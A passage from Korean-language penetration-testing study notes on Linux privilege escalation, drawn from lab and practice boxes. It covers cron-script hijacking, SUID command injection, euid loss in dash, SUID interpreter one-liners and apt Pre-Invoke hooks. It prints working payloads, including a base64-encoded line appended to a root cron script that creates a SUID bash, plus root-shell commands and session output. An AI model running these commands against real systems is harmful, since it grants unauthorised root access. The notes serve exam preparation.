→ **대기 중 다른 열거를 병행할 것** — `find -perm -4000` · `getcap` · `/etc/passwd` 사용자 목록 · `ss -lntp` 내부 전용 포트(D 절).

⚠️ **[[Muddy]] 의 `/etc/crontab` `PATH=/dev/shm:…` · `/dev/shm/netstat` 하이재킹 서술은 개작 전 노트에서 이관된 것이고 `~/PG/Muddy/` 에 뒷받침 산출물이 없음 — 근거부족임.** 위 메커니즘은 일반 지식으로 읽고 **「Muddy 에서 실측했다」로 인용하지 말 것.**

**⑶ 같은 부류이나 트리거가 «시간이 아닌» 것도 있음** — MOTD 체인(`/etc/update-motd.d/`)은 root 가 **SSH 로그인마다** 남의 파일을 실행함. 대기 없이 즉시 발동시킬 수 있어 크론보다 유리함(B-3-11 · [[Fowsniff]]).

**⑷ 감시 경로와 파일명 필터는 «추측하지 말고 스크립트를 읽어» 확정할 것 — 틀리면 에러 없이 조용히 무시됨.** [[Exfiltrated]] `/opt/image-exif.sh`:
```text
IMAGES='/var/www/html/subrion/uploads'
ls $IMAGES | grep "jpg" | while read filename; do
    exiftool "$IMAGES/$filename" >> $LOGFILE
done
```
- 감시 경로가 웹루트 그 자체(`/var/www/html/uploads`)가 아니라 **`subrion/` 하위 서브디렉터리**였음 — 흔한 오답이 웹루트를 문서 루트로 가정하는 것임
- `grep "jpg"` 는 확장자가 아니라 **파일명 어디에든 `jpg` 문자열이 있으면** 통과시킴 — `jpgpayload.txt` 도 통과, 반대로 `.jpeg` 는 통과 못함
- `exiftool "$IMAGES/$filename"` 처럼 **따옴표가 걸려 있으면 파일명 인젝션(`; nc …`)은 막힘**(B-35 의 반대 케이스) — 그러면 남는 경로는 **파일 «내용» 자체의 취약점**임(이 박스는 CVE-2021-22204 DjVu)

**⑸ 재시도 비용이 큰(크론 주기만큼 대기) 상황에서는 페이로드를 이중화할 것.**
```text
chmod +s /bin/bash          # 성공 확인이 `ls -l` 한 줄로 즉시, 네트워크 무관, 실패 원인 거의 없음
( 리버스셸 & )               # 즉시 대화형, 단 아웃바운드·리스너 점유에 실패 가능
```
리버스셸을 `( … & )` 로 감싸는 이유 — 크론이 실행한 프로세스(여기서는 exiftool)가 리버스셸에 물려 반환하지 않으면 그 크론 인스턴스가 끝나지 않고, 크론이 매분 새 인스턴스를 띄우며 프로세스가 쌓임. 서브셸 백그라운드는 부모(exiftool→크론)를 정상 종료시키고 셸만 고아 프로세스로 남김.
→ **핵심은 「네트워크와 무관한 성공 판정 채널」을 하나 확보하는 것**임. 리버스셸만 걸면 「코드가 실행 안 됨」과 「아웃바운드 차단」을 **구분할 방법이 없어** 60초짜리 추측을 반복하게 됨(A-31 의 계층 분리).
→ 일반화 — **결과가 즉시 안 나오는 익스플로잇은 «관측 채널»을 먼저 확보할 것.** [[Exfiltrated]] 는 셋을 가졌음: `ls -l /bin/bash`(SUID 반영) · 리스너(리버스셸) · `/opt/metadata/` 로그(크론이 파일을 봤는가). **채널이 하나뿐이면 실패 원인을 좁힐 수 없음.**

**⑹ 손절선 — 시도 1회에 크론 주기만큼 소요됨**(이 박스 60초):

| 시점 | 판단 |
|---|---|
| 2회 실패(약 2분) | 페이로드를 더 만들지 말고 **조건 재확인** — `ls -la` 로 파일이 실제로 있는지, 파일명이 필터를 만족하는지 |
| 3회 실패(약 3분) | 처리 로그(`/opt/metadata/`)를 `cat` — **「크론이 파일을 봤는가」와 「봤는데 실행이 안 됐는가」를 가름** |
| 5분 초과 | 이 경로를 접고 다른 권한상승 표면으로 전환(SUID · `/etc/passwd` 쓰기 · 다른 크론 · 커널) |

**폴링은 8초 간격이 적당함** — 60초 주기 대비 평균 4초 내 감지. 1초는 로그·프로세스만 늘리고 30초는 감지가 늦음.

**⑺ 크론을 발견하면 확인 우선순위가 정해져 있음.**
1. **스크립트 자체의 쓰기 권한** — 쓰기 가능하면 CVE 가 불필요함. `echo 'chmod +s /bin/bash' >> script.sh` 한 줄로 끝
2. **스크립트가 참조하는 파일·디렉터리의 권한**
3. **호출 바이너리의 취약점**(exiftool · convert · tar · 7z)

[[Exfiltrated]] 는 앞의 둘이 막혀 세 번째로 갔음. **역순으로 접근하면(CVE 부터) 가장 비싼 경로를 먼저 파는 것임.**

**⑻ 크론이 foothold 를 «낳는» 경우 — 크론이 «둘» 겹쳐 있는 것이 헷갈리는 지점임.**

[[Astronaut]] CVE-2021-21425:
```text
[공격자] POST → user/config/scheduler.yaml 기록          t = 0s
                        │ (여기서 아무 일도 일어나지 않음)
[시스템 crontab] * * * * * cd /var/www/html/grav-admin; /usr/bin/php bin/grav scheduler
                        │
                        ↓ 다음 분 경계에서 발화                t ≤ 60s
[bin/grav scheduler] scheduler.yaml 읽음 → 잡 enabled 확인 → 실행
```
- **시스템 crontab** — 매분 `bin/grav scheduler` 를 깨움. 박스의 원래 구성이고 공격자가 만든 것이 아님
- **앱 내부 스케줄러** — 깨어난 뒤 `scheduler.yaml` 의 잡들을 `at:` 표기에 따라 실행. 공격자가 심은 것이 여기

⛔ **시스템 크론이 없으면 이 CVE 는 「파일 쓰기」로 끝남.** RCE 로 승격되는 것은 **Grav 공식 설치 안내가 시킨 crontab 등록** 때문임 — 즉 대부분의 Grav 설치에 이 전제가 존재함. 실측 확인:
```text
www-data@gravity:~/html$ crontab -l
* * * * * cd /var/www/html/grav-admin;/usr/bin/php bin/grav scheduler 1>> /dev/null 2>&1
```

**⑼ 「셸이 늦게 붙는다」의 역추론 — 지연 원인은 사실상 셋뿐임.**

| 지연 양상 | 원인 | 확인법 |
|---|---|---|
| **주기적**(정확히 60초·300초 배수) | **크론·스케줄러** | 리스너를 켜둔 채 2주기 대기. 두 번 붙으면 확정 |
| 불규칙, 사람 개입 시점 | 관리자 시뮬레이션 봇(XSS·피싱형) | 5~15분 단위 |
| 즉시지만 느림(수 초) | 큐·워커(Redis·Sidekiq·Celery) | 부하와 무관하게 일정 |

**⑽ 설정 파일에 잡을 심는 부류에서 «가장 흔한» 실패 원인은 「정의는 했는데 활성화를 안 한 것」임.** 에러도 없고 응답도 같고 그냥 셸이 안 붙음 → 「익스가 안 통하네」로 오판하게 됨. [[Astronaut]] 페이로드의 `data[status][ncefs]=enabled` 가 정확히 그 키임.
→ **잡·작업·훅을 심을 때는 항상 `enabled`·`active`·`status` 계열 키가 «따로» 있는지 확인할 것.**

| 함정 | 증상 | 대응 |
|---|---|---|
| `status`·`enabled` 키 누락 | 저장은 됐는데 영원히 안 돎. 에러 없음 | 저장 후 다시 GET 해서 값 확인 |
| `at:` 주기 오타 | 6필드(`* * * * * *`)면 파서가 거부 | 크론은 **5필드**. 초 단위 필드 없음 |
| `command` 에 상대경로 | 스케줄러의 PATH 가 로그인 셸과 다름 | 항상 절대경로(`/usr/bin/php`) |
| 리버스셸이 크론 잡을 물고 늘어짐 | 셸은 붙는데 다음 주기 잡이 안 돎 | `( bash rev.sh & )` 로 백그라운드 |
| 아웃바운드 포트 차단 | 60초를 기다려도 안 붙음(크론 문제로 오인) | 4444 대신 443·80·53(A-31) |
| nonce 만료 | 첫 시도는 됐는데 재시도가 안 됨 | 매 요청마다 nonce 를 **새로 긁을 것**(B-1-14) |

**⑾ 재발사 잡은 셸을 잡은 «직후»가 정리 시점임.** 미루면 ①잊어버리고 ②그 사이 셸이 불안정해짐.

| 증상 | 원인 | 대응 |
|---|---|---|
| 매분 새 커넥션이 리스너에 쌓임 | 잡이 여전히 `enabled` | 첫 셸에서 즉시 설정 백업 후 잡 비활성화 |
| 셸이 갑자기 끊김 | 다음 주기 잡이 같은 포트로 붙으며 세션이 엉킴 | 안정 셸을 **다른 포트·다른 수단(SSH 키)** 으로 확보 후 잡 제거 |
| 잡이 스케줄러 전체를 물고 늘어짐 | 리버스셸이 포그라운드라 러너가 반환 안 함 | 페이로드를 처음부터 `( ... & )` 로 |

⚠️ **실전 평가에서 `at: '* * * * *'` 잡은 «명시적으로 제거해야 하는 지속성 아티팩트»임.** 리스너를 끄면 매분 실패한 커넥션이 쌓여 로그가 요란해짐 = 탐지 표면(C-5).


**⑺-1 의 교과서 사례 — [[Flu]].** `find / -writable` 에서 남은 줄이 `/opt/log-backup.sh` 하나였음:
```text
-rwxr-xr-x  1 confluence confluence       408 Dec 12  2023 log-backup.sh
```
**스크립트 세 줄이 전부를 말해 줌:**
1. `-rwxr-xr-x confluence confluence` — **내가 쓸 수 있음.** `/opt` 디렉터리 자체는 root 소유지만 파일 하나의 소유자가 저권한 계정임
2. `BACKUP_DIR="/root/backup"` — **남의 홈에 씀.** `/root` 가 `drwx------ root root` 이므로 이 스크립트는 **root 로 실행될 수밖에 없음.** 실행 주체를 «코드에서 역산»하는 것
3. `find $BACKUP_DIR -name "log_backup_*" -mmin +5 -exec rm -rf {} \;` — 5분보다 오래된 것을 지움 = **분 단위로 도는 작업**이라는 뜻. 주기를 «정리 조건에서 역산»하는 것

**페이로드는 `base64 -d` 로 밀어 넣을 것** — TTY 없는 셸에서 따옴표와 리다이렉션이 `send-keys` 를 거치며 깨지는 것을 피함:
```text
cp /opt/log-backup.sh /tmp/.lb.orig; echo Y3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2g7IGNobW9kIDQ3NTUgL3RtcC9yb290YmFzaA== | base64 -d >> /opt/log-backup.sh; tail -3 /opt/log-backup.sh; date
```
디코드 내용은 `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash`.

**무작정 `sleep 60` 하지 말고 폴링 루프를 쓸 것:**
```text
for i in $(seq 1 100); do [ -f /tmp/rootbash ] && break; sleep 5; done; date; ls -la /tmp/rootbash
```
- 주기를 모를 때도 통함(Flu 는 1분이었지만 5분일 수도 있었음)
- 도착하는 즉시 빠져나옴 — 고정 `sleep` 처럼 남은 시간을 버리지 않음
- 상한이 있어 크론이 안 돌 때 셸이 영원히 먹통이 되지 않음(Flu 는 최대 500초)

**그리고 `date` 를 앞뒤로 찍을 것** — `04:52:17` → `04:53:05` 의 48초가 「크론이 실제로 돌았다」는 **유일한 직접 증거**임.

**페이로드로 SUID bash 를 고른 이유는 «되돌리기가 가장 싸서»임.** 선택지는 `/etc/sudoers` 줄 추가 · `/root/.ssh/authorized_keys` 키 추가 · root 리버스셸 · SUID 셸 복사인데, SUID 셸은 파일 하나 지우면 끝이고 root 의 설정이나 `.ssh` 를 안 건드리며 리스너를 더 띄울 필요도 없음.

#### B-32. SUID 바이너리 명령주입 — 문자 필터는 `$()` 로 넘는다

**먼저 읽고 나서 칠 것** — `strings`·`objdump -d -M intel <바이너리>` 로 **`system` 호출·포맷 문자열·필터**를 확인. [[Wheels]] `/opt/get-list` 실측 흐름: `mov esi,0x3b` → `call strchr@plt`(`;` 검사) … `geteuid` → `setuid` → `system`.

**필터(`;` `|` `&`) 우회** — `$()`·백틱·개행·`<`·`>`.

⚠️ **`#!/bin/sh` SUID 스크립트는 dash 가 euid 를 버려 실패함**(B-33). C 바이너리이거나, `chmod +s /bin/bash` 후 `bash -p` 로 갈 것.

⚠️ **`bash -p` 는 euid 만 0 임.** 스크립트를 `sh` 로 감싸는 순간 권한이 빠짐(B-33). 실제 uid 까지 0 으로 만들려면:
```bash
python3 -c 'import os;os.setresuid(0,0,0);os.execl("/bin/bash","bash")'
```

**형제 사례 — 필터가 «아예 없으면» 세미콜론 하나로 끝남.** [[PwnLab]] `msg2root`(SUID root):
```text
$ strings /home/mike/msg2root | head -30
fgets
asprintf
system
Message for root: 
/bin/echo %s >> /root/messages.txt
```
`fgets` 로 stdin 을 받아 `asprintf` 로 포맷(`/bin/echo %s >> /root/messages.txt`)에 그대로 끼운 뒤 `system()` 실행 — 필터가 전무해 `$()` 같은 우회 기법조차 필요 없음:
```text
Message for root: hi; /bin/bash -p
hi
bash-4.3# id
uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
```
`hi` 가 먼저 출력되는 것이 `/bin/echo hi` 정상 실행 신호임. **`/bin/echo` 자체는 절대경로라 PATH 하이재킹은 안 통하지만, 무필터 문자열 삽입이 더 직접적인 구멍이었음.**
→ **SUID 바이너리를 만나면 PATH 하이재킹(상대경로)과 문자열 삽입(포맷·커맨드 인젝션)을 «둘 다» 확인할 것 — 서로 배타적이지 않음**(B-3-12).
— 출처: `~/PG/PwnLab/try4_fakecat_shadowed_PATH.log`

**출처** — [[Wheels]](`/opt/get-list`) · [[Assignment]] · [[PwnLab]](`msg2root`).

#### B-33. SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash)

**Ubuntu 의 `/bin/sh` 는 dash 이고, dash 는 시작할 때 euid ≠ ruid 면(그리고 `-p` 가 없으면) euid 를 ruid 로 되돌림.**

[[GLPI]] 에서 이것 때문에 **root 전용 정보를 하나도 못 걷은 채 박스를 정지**시켰음(A-41). `rootbash -p` 까지는 root(`ps` 의 USER 컬럼이 `root`)였는데 `sh /tmp/.h.sh` 로 넘기는 순간 권한이 빠졌음.

**Kali 재현**(2026-08-25, SUID `bash` 사본으로 4케이스 확인):

| 명령 | 결과 |
|---|---|
| `-p -c 'id'` | `euid=0` |
| `-p -c 'sh -c id'` | **소실** |
| `-p -c 'bash -c id'` | **소실** |
| `-p -c 'bash -p -c id'` | `euid=0` 유지 |

⚠️ **이 재현을 `/tmp` 에서 하면 네 경우 다 `euid=0` 이 안 나와 「설명이 틀렸나」로 헛짚기 쉬움.** Kali 의 `/tmp` 가 `nosuid` 로 마운트돼 SUID 비트가 아예 무시되기 때문 — `findmnt -no OPTIONS /tmp` → `rw,nosuid,nodev,size=12463400k,nr_inodes=1048576,inode64`. **홈 디렉터리에서 할 것.**

→ **스크립트를 넘길 때는 `sh x.sh` 가 아니라 `bash -p x.sh`.** 그리고 SUID 셸을 열면 **먼저 `id` 를 찍어 `euid=0` 을 확인**한 다음 열거를 돌릴 것.

**[[PlanetExpress]] 도 같은 함정 — 그리고 이 박스에서 제일 값비쌌음.** SUID Go 바이너리(`relayd`)의 PATH 하이재킹 스크립트를 `#!/bin/sh` 로 심자 **스크립트는 분명히 실행되고 `chmod 4755` 도 먹었으나** `rootbash` 소유자가 www-data 라 무의미했음. 부모(`relayd`, `ps` 의 `EUSER=root`)와 자식(`/proc/self/status` 의 `Uid: 33 33 33 33`)을 대비해 「실행은 됐는데 권한이 안 넘어옴」을 확정했음.
- **살려준 것은 스크립트에 넣어둔 `id > /tmp/.x/whoami.txt` 였음** — `euid=0` 이 없어서 이상하다고 느꼈고, 다음 시도에서 `/proc/self/status` 와 `ps -o euser -p $PPID` 를 같이 찍어 대비를 잡았음
- `#!/usr/bin/python3` + `os.setreuid(0,0)` 로 교체하니 `(33, 0)`(setreuid 호출 **전** 상태를 먼저 파일에 기록하는 설계 — 실패해도 「euid 가 넘어오긴 했는가」는 남음) → real uid 까지 0 으로 올린 뒤 `cp`/`chmod` → root 소유 SUID `rootbash` 획득

**⛔ 진단 팁 — 하이재킹 페이로드에 반드시 `id` 를 심을 것.** **파일이 «생겼는지»가 아니라 «어떤 권한으로» 생겼는지**를 봐야 함. 파일 생성 자체는 성공·실패와 무관하게 일어남.
→ **「실행됐다」와 「권한이 넘어왔다」는 다른 사건임.** 셸 스크립트가 이 둘을 갈라놓는 대표적인 지점임.
— 출처: `~/PG/PlanetExpress/try10_pathhijack.log` · `try11_suid_debug.log` · `try12_python_hijack.log`. Kali 로컬 재현(이 박스가 아니라 **Kali 로컬 실측**)으로 dash·bash(`-p` 없음)는 euid 소실, python 은 `(1000, 0)` 유지, `bash -p`·`#!/bin/sh -p`·`#!/bin/bash -p` 는 euid 유지 — 4가지 케이스 전부 확인함.

**GTFOBins `start-stop-daemon` 도 같은 메커니즘 — 그리고 SUID 탭에만 `-p` 가 붙어 있는 이유가 이것임.** [[Sorcerer]] — 비표준 SUID `/usr/sbin/start-stop-daemon` 으로 root:
```sh
start-stop-daemon -S -x /bin/sh -- -p
```
- **`-x`(`--exec`)가 지정한 프로그램을 실행하는 것이 본질**이라 SUID 가 붙으면 「임의 프로그램을 root 로 실행」과 같아짐
- **`--` 는 옵션 종료 구분자임** — 빼면 뒤의 `-p` 를 `start-stop-daemon` 자신의 `--pidfile` 로 오인함(Kali 확인: `option requires an argument -- 'p'`)
- GTFOBins 는 Shell·Sudo 탭에는 `-p` 를 안 쓰고 **SUID 탭에만** 씀 — 「기본 셸이 SUID 특권을 버리지 않는 배포판에서는 `-p` 를 빼라」는 주석이 붙어 있음. **데비안의 `/bin/sh` 는 dash 라 여기서는 `-p` 가 필수임**

⚠️ **같은 `-x` 인스턴스가 이미 떠 있으면 셸이 안 뜨고 exit 1 로 끝남.** Kali 재현(2026-08-26):
```text
$ start-stop-daemon -S -x /usr/bin/sleep -- 300
/usr/bin/sleep already running.
EXIT=1
```
`/bin/sh` 는 시스템에 항상 떠 있을 수 있으므로 **셸이 안 뜨는데 에러도 안 보이면 이것부터 의심할 것.** 회피는 사본을 만들어 다른 경로로 부르는 것 — `cp /bin/sh /tmp/x && start-stop-daemon -S -x /tmp/x -- -p`. **`-x` 는 절대경로 필수임.**

**출처** — [[GLPI]] · [[PlanetExpress]] · [[Sorcerer]].

⛔ **정정 — 「`-p` 를 빠뜨리면 실패한다」는 «euid ≠ uid 인 경우에 한해» 참임.**

셸의 자기방어는 **시작 시점에 `euid ≠ uid` 를 감지했을 때** `setuid(getuid())` 를 부르는 것임. 그러므로 **real uid 를 먼저 0 으로 올려 두면 그 조건 자체가 성립하지 않아 `-p` 가 불필요함.**

| 경로 | 시작 시 uid/euid | `-p` |
|---|---|---|
| `pcntl_exec('/bin/sh', ['-p'])` | `uid=33 euid=0` → 불일치 | **필요함** |
| `posix_setuid(0); system("/bin/sh -i")` | `uid=0 euid=0` → 일치 | **불필요함** |

[[Astronaut]] 실측 — GTFOBins `php` 의 Capabilities 탭 한 줄을 SUID 에 그대로 써서 root 를 얻었고 `-p` 는 쓰지 않았음:
```text
www-data@gravity:~/html$ php -r 'posix_setuid(0); system("/bin/sh -i");'
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/proof.txt
c7ff755b6276ae84f7e2a1e0a29de698
```
— 출처: `파일보관/Pasted image 20260615153700.png`

→ **`posix_setuid(0)` 쪽이 실무적으로 더 안전함.** ① `-p` 를 잊어도 되고 ② `id` 출력에 `uid=0(root)` 가 찍혀 **증거 스크린샷이 깔끔함**(`euid=0`·`uid=33` 이 섞이면 채점자가 갸웃함).

**`euid=0` 만으로 되는 것과 안 되는 것:**

| 상황 | `euid=0` 만으로 |
|---|---|
| `/root/proof.txt` 읽기 | **됨** — 파일 접근 검사는 euid 로 함 |
| 파일 쓰기·소유권 변경·SSH 키 심기 | **됨** |
| 자체 uid 검사를 하는 프로그램(`sudo`·`su`·`screen`)·`passwd` 변경 | **안 될 수 있음** → real uid 도 올릴 것 |

**인터프리터별 한 줄:**

| 인터프리터 | root 셸 |
|---|---|
| `php` | `php -r "pcntl_exec('/bin/sh', ['-p']);"` · `php -r 'posix_setuid(0); system("/bin/sh -i");'` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` · `os.setresuid(0,0,0)` 선행 |
| `perl` | `perl -e 'exec "/bin/sh", "-p";'` |
| `ruby` | `ruby -e 'exec "/bin/sh", "-p"'` |

⚠️ **인터프리터가 SUID 면 GTFOBins 를 찾을 필요조차 없음.** 일반 바이너리는 그 기능 안에서 탈출로를 찾아야 하지만(GTFOBins 가 하는 일), **인터프리터의 존재 목적이 임의 코드 실행**이라 그냥 코드를 쓰면 됨.
⚠️ 이 root 셸도 TTY 가 아님 — 프롬프트가 `#` 하나뿐임(A-38).

#### B-34. root 로 도는 서비스의 «쓰기 가능한» 경로 = 권한상승

**소유자일 필요 없음. 쓰기만 되면 됨.**

[[GLPI]] — Jetty 가 root 로 구동되고 그 `webapps/` 에 저권한 유저가 쓸 수 있었음 → **context XML 투하만으로 Jetty 가 root 로 실행.**

**같은 부류** — Tomcat(`webapps` WAR) · cron(스크립트) · systemd(unit 파일) · 그 밖에 root 프로세스가 읽거나 실행하는 모든 파일.

**탐지** — `ps aux`(누가 root 로 도는가) ∩ `find / -writable -type d`(내가 쓸 수 있는 곳)의 **교집합**. [[GLPI]] 는 정확히 이 교집합이 답이었음.

**웹서버 자체가 root 로 돌면 웹셸이 곧 root 셸임 — 권한상승 단계가 통째로 사라짐.** [[Hawat]] — `/etc/nginx/nginx.conf` 의 **`user root;`** 로 nginx 와 php-fpm7 이 둘 다 root 구동. 30455 웹루트(`/srv/http`, 0777)에 심은 PHP 가 첫 명령부터 `uid=0(root) gid=0(root) groups=0(root)`.
같은 호스트의 50080 Apache 웹루트(`/srv/apache`, 역시 0777)에 심었다면 `uid=33(http)` 에 그쳤음 — **어느 쪽에 심는가가 권한상승 유무를 결정함**(A-2-14).

**투하 전 한 줄** — `ps aux | grep -E 'nginx|apache|php-fpm'`. [[Hub]](FuguHub `User=root`)도 같은 부류임.

⚠️ **파일을 «쓴» 주체와 그 파일을 «실행하는» 주체는 다름.** [[Hawat]] 에서 쓴 것은 mysqld(`mysql` 사용자, `INTO OUTFILE`)이고 실행한 것은 php-fpm(root)임. 「쓰기가 됐다 = DB 가 root 다」로 넘어가면 오진임(A-61).

**`apt` 훅 — 「root 크론이 매분 `apt-get update` 를 돌고 `/etc/apt/apt.conf.d` 가 쓰기 가능」의 조합.** 리눅스 Fundamental 의 단골 마무리임.

`apt` 는 기동 시 `/etc/apt/apt.conf.d/` 안의 **모든 파일을 사전순으로 읽어** 설정으로 병합함. 그중 `APT::Update::Pre-Invoke` 는 `apt-get update` 가 실제 갱신을 시작하기 **전에** 실행할 셸 명령 목록임. 디렉터리에 쓸 수 있으면 훅을 추가할 수 있고, root 가 `apt-get update` 를 돌리므로 훅도 root 로 돎.
```text
APT::Update::Pre-Invoke {"cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod 4755 /tmp/rootbash";};
```
- **파일명은 `99zzpwn`** — 사전순 마지막이라 기존 설정과 충돌하지 않음
- **리버스셸보다 SUID bash 가 나음** — 리스너를 더 띄울 필요가 없고, **정리할 때 파일 두 개만 지우면 원상복구**됨
- **`mount` 로 `/tmp` 의 마운트를 먼저 볼 것.** 별도 tmpfs 에 `nosuid` 가 걸려 있으면 이 페이로드는 **조용히 실패**함. [[Flimsy]] 는 `/dev/mapper/ubuntu--vg-ubuntu--lv on / type ext4 (rw,relatime)` 로 `/` 위였음
- **`-p` 를 빼지 말 것** — bash 는 `euid ≠ uid` 로 시작하면 스스로 특권을 드롭함. `/tmp/rootbash -p` 라야 `uid=65534 … euid=0` 이 유지됨(B-33 · B-36 과 같은 함정)
- **정리 순서** — 훅을 **먼저** 지우고 한 크론 사이클을 기다린 뒤 `rootbash` 를 지울 것. 반대로 하면 다음 분에 다시 생성됨(C-5)
- ⚠️ **매분 도는 크론이 `/etc` 를 덮어쓰는 경우가 있음** — [[Flimsy]] 의 `/root/run.sh` 는 `.passwd.bak`·`.shadow.bak`·`.group.bak` 를 매분 `/etc` 로 복사함. **`/etc/passwd` 에 사용자를 추가하는 고전 경로는 60초 안에 지워짐**(B-37)
- **권한이 오르면 열거를 다시 돌릴 것** — [[Flimsy]] 의 두 번째 경로(`/root/run.sh` 가 **777** 이고 매분 root 로 실행)는 root 를 잡은 뒤에야 보였음. `/root` 가 `drwx------` 라 저권한에서는 **디렉터리를 통과조차 못 함.** 경로가 존재해도 도달이 불가능한 경우가 있음(A-41). `[가정]` `/root` 가 `755` 였다면 이쪽이 apt 훅보다 빠른 경로였을 것임

⚠️ **훅 파일은 원격에서 `printf` 로 만들지 말 것** — 이스케이프가 한 겹 먹혀 조용히 깨짐(B-84).

**출처** — [[GLPI]] · [[Hawat]] · [[Flimsy]](apt 훅).

#### B-35. `find -exec sh -c '... {}'` 는 파일명 인젝션이다

**`{}` 가 셸 문자열 «안»으로 들어가면 파일명이 곧 명령임.** 크론 스크립트를 읽었을 때 **`-exec` 뒤에 셸이 끼어 있는지**만 보면 됨 — 셸이 없으면 안 통함.

**제약과 우회** — 파일명에 `/` 를 못 쓰므로 `$(command -v <이름>)`·`${IFS}`·`cd` 연쇄로 우회.

**출처** — [[Assignment]](`/usr/bin/clean-tmp.sh`, root 크론).

#### B-36. SUID `find` 는 그 자체로 root — `-p` 를 빠뜨리면 실패한다

GTFOBins 정석은 `find . -exec /bin/sh -p \; -quit`. 셸만 bash 로 바꿔도 통함(Debian 계열 `/bin/sh`=dash 도 `-p` 를 받음, Kali `dash -p -c` 로 확인).

**`-p` 를 빠뜨리면 어느 쪽이든 실패** — `man bash` INVOCATION: euid 가 실제 uid 와 다르게 시작하면 "the effective user id is set to the real user id", `-p` 가 있으면 "not reset".

**SUID 목록 판정법은 «목록 길이»가 아니라 «배포판 기본과의 차집합»이다.** [[BossPlayersCTF]] 는 Debian 기본 SUID 11종을 그대로 갖고 있었고 `find`·`grep` 두 개만 비정상이었음(Kali `test -u` 로 대조). 이런 박스에서 권한상승에 5분 이상 쓰면 방향이 틀린 것.

⛔ **제목의 「`-p` 를 빠뜨리면 실패한다」는 «euid ≠ uid 인 경우에 한해» 참임** — real uid 를 먼저 0 으로 올리면(`posix_setuid(0)`·`setresuid(0,0,0)`) 셸의 자기방어 조건 자체가 성립하지 않아 `-p` 가 불필요함. 근거와 실측은 B-33 에 있음.

**SUID 목록 판정은 목록을 «읽는» 것이 아니라 배포판 기본을 «지우는» 것임.** 기본 목록을 알면 나머지를 읽지 않고 지움 — 남은 것만 봄.

**우분투·데비안 기본 SUID:**

| 분류 | 바이너리 |
|---|---|
| 계정·암호 | `passwd` · `chfn` · `chsh` · `gpasswd` · `newgrp` · `su` |
| 권한 위임 | `sudo` · `pkexec`(*) · `polkit-agent-helper-1` |
| 마운트 | `mount` · `umount` · `fusermount` |
| 기타 | `ssh-keysign` · `dbus-daemon-launch-helper` · `snap-confine` · `dmcrypt-get-device` |

(*) `pkexec` 은 기본 SUID 지만 **버전에 따라 CVE-2021-4034(PwnKit)** 자체가 권한상승임([[Exghost]]). **「기본이니까 무시」가 아니라 「기본이지만 버전을 본다」가 정확한 태도임.**

⛔ **`/snap/core20/…` 두 벌은 같은 스냅 리비전의 중복이라 통째로 노이즈임.** `grep -v '^/snap/'` 한 줄만으로 [[Astronaut]] 의 목록이 **절반으로 줄고 남는 것이 두 줄**이었음(`/usr/bin/php7.4` · `/usr/bin/at`).
```bash
find / -perm -4000 -type f 2>/dev/null | grep -v '^/snap/' | sort > /tmp/s.txt
```

⚠️ **눈이 미끄러지는 형태임** — 정답이 목록 안에 있는데도 못 찾기 쉬움. `/snap/core20/` 두 벌이 시각적으로 큰 자리를 차지하고 나머지는 전부 익숙한 이름이라 눈이 훑고 지나감. **대응은 필터링이 아니라 기본 목록 암기임.**
⚠️ **`linpeas` 류의 자동 강조를 부재 근거로 쓰지 말 것** — 강조 규칙이 최신 배포판을 못 따라가면 진짜 항목을 놓침(A-11). 수동 대조가 확실하고 20줄이면 3초임.

**`find` 플래그:**

| 조각 | 빼면 |
|---|---|
| `-perm -4000` — 앞의 `-` 는 「이 비트를 포함」 | `-perm 4000` 은 퍼미션이 **정확히 `4000`** 인 것만 — 실질적으로 아무것도 안 나옴 |
| `-type f` | 디렉터리·심볼릭 링크 노이즈가 섞임 |
| `2>/dev/null` | stderr 가 수백 줄 쏟아져 결과를 못 찾음 |

setgid 도 같이 보려면 `-perm -u=s -o -perm -g=s`.

**대안 경로가 둘이면 «즉시성»으로 고를 것.** [[Astronaut]] 은 `php7.4`(즉시)와 `at`(작업 큐 지연, `atd` 데몬 필요 + `/etc/at.deny` 게이트)가 남았고 즉시 경로를 골랐음 — **크론으로 이미 60초를 기다린 뒤라 여기서 또 지연 경로를 고르면 대기가 두 배**가 됨. ⚠️ `at` 은 **시도한 기록이 없음**(배제가 아니라 미시도).


**SUID 셸을 «만들어» 심는 경우에도 같은 함정임.** [[Flu]] — 크론 페이로드로 `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash` 를 심었고, 그냥 실행하면 평범한 `confluence` 셸이 나옴. 반드시 `-p` 임.

**그리고 `euid=0` 과 `uid=0` 은 다름:**
```text
confluence@flu:...$ python3 -c "import pty;pty.spawn([\"/tmp/rootbash\",\"-p\"])"
rootbash-5.2# id
uid=1001(confluence) gid=1001(confluence) euid=0(root) groups=1001(confluence)

rootbash-5.2# python3 -c "import os;os.setresuid(0,0,0);os.setresgid(0,0,0);os.execl(\"/bin/bash\",\"bash\",\"-i\")"
root@flu:...# id
uid=0(root) gid=0(root) groups=0(root),1001(confluence)
```
— 출처: `~/PG/Flu/privesc_session.log`

플래그를 읽는 데는 `euid=0` 이면 충분함. 차이가 생기는 곳은 셋:
- 일부 도구가 `getuid()` 로 권한을 판정해 거부함
- `su`·`ssh`·`sudo` 같은 SUID 프로그램이 **실제 UID** 를 봄
- **증거 스크린샷** — 프롬프트가 `rootbash-5.2#` 로 뜨는 것보다 `uid=0(root)` 한 줄이 심사관에게 훨씬 명확함(C-3)

`setresuid(0,0,0)` 은 실제·실효·저장 UID 를 전부 0 으로 못 박음. `euid` 가 이미 0 이라 허용됨.
⚠️ SUID 셸을 `pty.spawn` 으로 띄운 것도 요점임 — TTY 없는 리버스셸에서 대화형 root 셸을 얻는 표준 수순.

#### B-37. `/etc/shadow` 행 선삽입 — `getspnam()` first-match

**`/etc/shadow` 는 같은 이름의 행이 여러 개 있어도 오류가 아님.** 인증은 `getspnam()` 이 찾아낸 **첫 일치 행** 하나만 보므로, 원본보다 «앞»에 자기 해시를 끼워 넣으면 그 계정을 그대로 가져감.

→ **필드에 개행을 넣을 수 있는 도구는 그 자체로 계정 탈취 수단임.** sudo 로 허용된 도구가 사용자 인자를 shadow 필드에 조립한다면 그 한 가지로 충분함.

